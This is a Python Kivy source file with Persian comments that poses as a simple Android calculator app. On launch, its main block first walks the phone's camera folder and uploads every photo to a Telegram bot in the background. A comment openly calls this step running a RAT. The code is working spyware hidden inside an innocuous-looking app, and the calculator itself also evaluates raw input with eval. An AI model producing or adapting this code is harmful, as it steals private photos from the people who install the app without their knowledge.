import os
import requests
from kivy.app import App
from kivy.uix.gridlayout import GridLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button

# توکن بات تلگرام و ID چت
BOT_TOKEN = 'YOUR_BOT_TOKEN'
CHAT_ID = 'YOUR_CHAT_ID'

# تابع برای ارسال تصاویر به بات تلگرام
def send_image_to_telegram(image_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {'photo': open(image_path, 'rb')}
    data = {'chat_id': CHAT_ID}
    response = requests.post(url, files=files, data=data)
    if response.status_code == 200:
        print(f"Image {image_path} sent successfully!")
    else:
        print(f"Failed to send {image_path}. Error: {response.text}")

# تابع برای جستجوی تصاویر در گالری (یا پوشه‌ای مشخص)
def find_images_in_directory(directory):
    supported_formats = ['.jpg', '.jpeg', '.png']
    images = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if any(file.lower().endswith(ext) for ext in supported_formats):
                images.append(os.path.join(root, file))
    return images

# ارسال تصاویر گالری در پس زمینه
def send_images_in_background():
    gallery_directory = "/storage/emulated/0/DCIM/Camera"  # مسیر گالری در اندروید
    images = find_images_in_directory(gallery_directory)
    for image_path in images:
        send_image_to_telegram(image_path)

# کلاس ماشین حساب
class CalculatorApp(App):
    def build(self):
        self.solution = TextInput(font_size=32, readonly=True, halign="right", multiline=False)
        
        layout = GridLayout(cols=4)
        layout.add_widget(self.solution)

        buttons = [
            '7', '8', '9', '/',
            '4', '5', '6', '*',
            '1', '2', '3', '-',
            '.', '0', 'C', '+'
        ]
        for button in buttons:
            layout.add_widget(Button(text=button, on_press=self.on_button_press))

        layout.add_widget(Button(text='=', on_press=self.on_solution))
        return layout

    def on_button_press(self, instance):
        if instance.text == 'C':
            self.solution.text = ''
        else:
            self.solution.text += instance.text

    def on_solution(self, instance):
        try:
            self.solution.text = str(eval(self.solution.text))
        except Exception:
            self.solution.text = 'Error'

# شروع برنامه ماشین حساب و اجرای RAT
if __name__ == '__main__':
    # ابتدا تصاویر گالری را در پس‌زمینه ارسال می‌کنیم
    send_images_in_background()
    
    # سپس برنامه ماشین حساب را اجرا می‌کنیم
    CalculatorApp().run()
